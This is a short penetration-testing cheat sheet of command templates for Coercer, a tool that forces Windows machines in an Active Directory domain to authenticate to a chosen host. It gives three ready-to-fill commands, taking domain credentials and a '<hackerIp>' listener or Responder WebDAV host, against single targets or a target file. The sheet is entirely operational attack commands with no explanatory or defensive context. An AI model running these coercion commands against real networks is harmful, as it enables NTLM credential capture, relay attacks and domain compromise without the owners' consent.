# coercer

% adcs, certificate, windows, Active directory, template

## coercer - list vulns
#platform/linux #target/remote #cat/RECON
```
coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> 
```

## coercer - Webdav
#platform/linux #target/remote #cat/RECON
```
coercer.py -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' <targetIp> 
```

## coercer - List vulns many targets
#platform/linux #target/remote #cat/RECON
```
coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile> 
```